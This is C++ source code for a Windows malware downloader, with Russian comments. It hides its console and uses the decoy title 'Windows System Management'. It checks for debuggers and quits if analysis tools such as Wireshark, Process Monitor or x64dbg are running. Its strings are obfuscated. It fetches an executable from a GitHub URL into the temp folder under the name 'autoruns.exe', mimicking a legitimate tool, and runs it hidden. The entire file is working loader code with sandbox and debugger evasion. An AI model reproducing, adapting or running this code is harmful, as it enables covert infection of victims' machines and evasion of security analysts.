#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <wininet.h>
#include <urlmon.h>
#include <iostream>
#include <string>
#include <vector>
#include <time.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <wincrypt.h>
#include <algorithm>
#include "skCrypter.h"  


#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ntdll.lib")

#define NtCurrentProcess() ( (HANDLE)(LONG_PTR)-1)
// Прототипы функций NtQueryInformationProcess
extern "C" NTSTATUS NTAPI NtQueryInformationProcess(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength);

// Структуры для работы с NtQueryInformationProcess
typedef struct _PROCESS_BASIC_INFORMATION {
    ULONG PebBaseAddress; //peb
    ULONG BasePriority; // приоритет запуска
    ULONG UniqueProcessId; // id process 
    ULONG InheritedFromUniqueProcessId; // id родителя ?кто нас запустил?
} PROCESS_BASIC_INFORMATION;

// Проверка на наличие объекта отладки ( функция api не документированная официально,  
// но используется антивирусами, с помощью nt_cur_process  программа проверяет саму себя *есть ли у меня отладочный объект?*
bool detectDebuggerByDebugObject() {
    HANDLE hDebObj = NULL;
    NTSTATUS status = NtQueryInformationProcess(NtCurrentProcess(), 0x1E, &hDebObj, sizeof(hDebObj), NULL); 

    if (status == 0x00000000 && hDebObj) {
        std::cout << "Debugger detected by DebugObject!" << std::endl;
        return true;
    }
    return false;
}

// Проверка флага отладки 
bool detectDebuggerByProcessDebugFlags() {
    ULONG NoDebugInherit = 0;
    NTSTATUS status = NtQueryInformationProcess(NtCurrentProcess(), 0x1F, &NoDebugInherit, sizeof(NoDebugInherit), NULL);  

    if (status == 0x00000000 && NoDebugInherit == 0) {
        std::cout << "Debugger detected by ProcessDebugFlags!" << std::endl;
        return true;
    }
    return false;
}

// Проверка родительского процесса
bool detectParentProcess() {
    PROCESS_BASIC_INFORMATION baseInf;
    NTSTATUS status = NtQueryInformationProcess(NtCurrentProcess(), 0, &baseInf, sizeof(baseInf), NULL);  

    if (status == 0x00000000) {
        DWORD parentProcessId = baseInf.InheritedFromUniqueProcessId;

        // Получаем имя родительского процесса
        HANDLE hParentProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, parentProcessId);
        if (hParentProcess) {
            DWORD dwSize = MAX_PATH;
            char parentProcessName[MAX_PATH];
            if (QueryFullProcessImageNameA(hParentProcess, 0, parentProcessName, &dwSize)) {
                std::string parentName(parentProcessName);
                std::transform(parentName.begin(), parentName.end(), parentName.begin(), ::tolower);

                // Проверяем, не является ли родительским процессом отладчик
                if (parentName.find("ollydbg.exe") != std::string::npos ||
                    parentName.find("x64dbg.exe") != std::string::npos ||
                    parentName.find("x32dbg.exe") != std::string::npos ||
                    parentName.find("explorer.exe") != std::string::npos) {
                    std::cout << "Debugger detected by Parent Process!" << std::endl;
                    CloseHandle(hParentProcess);
                    return true;
                }
            }
            CloseHandle(hParentProcess);
        }
    }
    return false;
}

// Проверка на наличие отладчиков
bool detectSecurityTools() {
    const wchar_t* tools[] = {
        skCrypt(L"wireshark"), skCrypt(L"procmon"), skCrypt(L"processhacker"),
        skCrypt(L"processhacker2"), skCrypt(L"procexp"), skCrypt(L"ida64"),
        skCrypt(L"ollydbg"), skCrypt(L"pestudio"), skCrypt(L"dnspy"), skCrypt(L"x64dbg")
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            std::wstring procName = pe32.szExeFile;
            std::transform(procName.begin(), procName.end(), procName.begin(), ::tolower);

            for (const auto& tool : tools) {
                if (procName.find(tool) != std::wstring::npos) {
                    CloseHandle(hSnapshot);
                    return true;
                }
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return false;
}

// Зашифрованный URL для скачивания
std::wstring getDownloadURL() {
    auto url = skCrypt(L"https://raw.githubusercontent.com/wh0ami-hash/test-with-crypt/main/Autoruns.exe");
    return url.decrypt(); // Возвращаем расшифрованную строку
}

// Проверка интернет-соединения
bool checkInternetConnection() {
    const wchar_t* servers[] = {
        skCrypt(L"https://www.google.com"),
        skCrypt(L"https://www.microsoft.com"),
        skCrypt(L"https://www.cloudflare.com")
    };

    for (const auto& server : servers) {
        if (InternetCheckConnectionW(server, FLAG_ICC_FORCE_CONNECTION, 0)) {
            return true;
        }
    }

    return false;
}

// Загрузка файла без шифрования
bool downloadFile(const std::wstring& url, const std::wstring& savePath) {
    return URLDownloadToFileW(NULL, url.c_str(), savePath.c_str(), 0, NULL) == S_OK;
}

// Запуск скачанного файла
bool executeFile(const std::wstring& filePath) {
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    BOOL result = CreateProcessW(filePath.c_str(), NULL, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    if (result) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return result;
}

int main() {
    srand(static_cast<unsigned int>(time(NULL) ^ GetCurrentProcessId()));

    // Установим зашифрованный заголовок консоли
    auto consoleTitle = skCrypt(L"Windows System Management");
    SetConsoleTitleW(consoleTitle);
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Проверка на отладчик
    if (detectDebuggerByDebugObject() || detectDebuggerByProcessDebugFlags() || detectParentProcess()) {
        return 0;
    }

    // Проверка наличия подозрительных процессов
    if (detectSecurityTools()) {
        return 0;
    }

    // Проверка интернет-соединения
    if (!checkInternetConnection()) {
        return 1;
    }

    wchar_t tempPath[MAX_PATH];
    if (GetTempPathW(MAX_PATH, tempPath) == 0) return 1;

    // Расшифровка пути для сохранения файла
    auto encryptedSavePath = skCrypt(L"autoruns.exe");
    std::wstring savePath = std::wstring(tempPath) + encryptedSavePath.decrypt();
    std::wstring downloadURL = getDownloadURL();

    // Загрузка файла
    if (!downloadFile(downloadURL, savePath)) {
        return 1;
    }

    // Выполнение скачанного файла
    if (!executeFile(savePath)) {
        return 1;
        system("pause");
    }

    return 0;
}
